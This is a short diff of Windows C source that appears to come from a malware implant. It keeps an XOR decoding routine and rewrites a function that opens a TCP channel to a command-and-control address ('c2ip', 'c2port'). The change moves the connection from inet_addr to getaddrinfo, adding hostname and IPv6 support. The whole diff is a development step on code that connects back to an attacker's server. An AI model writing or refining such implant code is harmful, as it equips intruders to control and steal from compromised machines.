@@ -1,5 +1,5 @@
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <string.h>
 #include <stdio.h>
@@ -29,18 +29,26 @@ static void XorDecode(unsigned char *buf, int len) {
 }
 
 static SOCKET EstablishChannel(const char *c2ip, int c2port) {
-    SOCKET sock;
-    struct sockaddr_in target;
-    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    if (sock == INVALID_SOCKET) return INVALID_SOCKET;
-    target.sin_family = AF_INET;
-    target.sin_port = htons((unsigned short)c2port);
-    target.sin_addr.s_addr = inet_addr(c2ip);
-    if (WSAConnect(sock, (SOCKADDR *)&target, sizeof(target),
-                   NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
-        closesocket(sock);
+    struct addrinfo hints, *res = NULL, *p;
+    SOCKET sock = INVALID_SOCKET;
+    char portstr[8];
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family   = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    _snprintf(portstr, sizeof(portstr), "%d", c2port);
+    if (getaddrinfo(c2ip, portstr, &hints, &res) != 0)
         return INVALID_SOCKET;
+    for (p = res; p != NULL; p = p->ai_next) {
+        sock = WSASocket(p->ai_family, p->ai_socktype, p->ai_protocol, NULL, 0, 0);
+        if (sock == INVALID_SOCKET) continue;
+        if (WSAConnect(sock, p->ai_addr, (int)p->ai_addrlen,
+                       NULL, NULL, NULL, NULL) == 0)
+            break;
+        closesocket(sock);
+        sock = INVALID_SOCKET;
     }
+    freeaddrinfo(res);
     return sock;
 }
 
